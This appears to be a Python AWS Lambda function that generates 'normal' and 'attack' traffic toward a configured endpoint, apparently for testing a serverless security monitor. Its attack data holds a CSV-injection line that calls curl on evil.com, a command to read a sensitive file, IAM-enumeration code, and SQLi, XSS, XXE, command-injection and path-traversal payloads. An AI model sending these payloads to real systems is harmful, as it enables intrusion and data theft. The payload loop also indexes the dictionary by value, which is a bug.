import os
import urllib2
import json


attack_payload = {"mode": "attack", "payloads": {
                        "io":       "",
                        "host":     "evil.com",
                        "file":     "/tmp/target",
                        "cmd":      ['cat', '/var/task/sensitive.file'],
                        "code":     "import boto3\nc=boto3.client('iam')\nr=c.list_users()\nprint(r)"
}}

io_payloads = {
    "sqli": "' waitfor delay '0:0:20' /* ",
    "nosql": ", $where: '1 == 1'",
    "xss": "<script>do_evil()</script>",
    "xxe": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY ac SYSTEM \"php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php\">]>\n<foo><result>&ac;</result></foo>",
    "csvi": "=cmd|' /C curl evil.com'!'A1'",
    "cmdi": "cd var; cd task; tar -czvf source.tar.gz /tmp",
    "codei": "from subprocess import Popen, PIPE",
    "lfi": "../../../task/var/lambda_handler.py"
}

normal_payload = os.environ["normal_payload"]


def lambda_handler(event, context):
    if "mode" in event:
        mode = event["mode"]

        if mode == "do_normal":
            payload = json.dumps(json.loads(normal_payload))
            try:
                target = os.environ["target_endpoint"]
                req = urllib2.Request(url=target, data=payload)
                urllib2.urlopen(req)

            except Exception as e:
                print("[ERROR] {}".format(str(e)))

        elif mode == "do_attack":
            # behavioral
            payload = json.dumps(attack_payload)
            try:
                target = os.environ["target_endpoint"]
                req = urllib2.Request(url=target, data=payload)
                urllib2.urlopen(req)

            except Exception as e:
                print("[ERROR] {}".format(str(e)))

            # i/o
            for k,v in io_payloads.iteritems():
                payload = attack_payload
                payload["payloads"][k] = io_payloads[v]
                try:
                    target = os.environ["target_endpoint"]
                    req = urllib2.Request(url=target, data=json.dumps(payload))
                    urllib2.urlopen(req)

                except Exception as e:
                    print("[ERROR] {}".format(str(e)))

        else:
            print("[ERROR] invalid mode in event")
            return

        return

    else:
        print("[ERROR] invalid event input")
        return
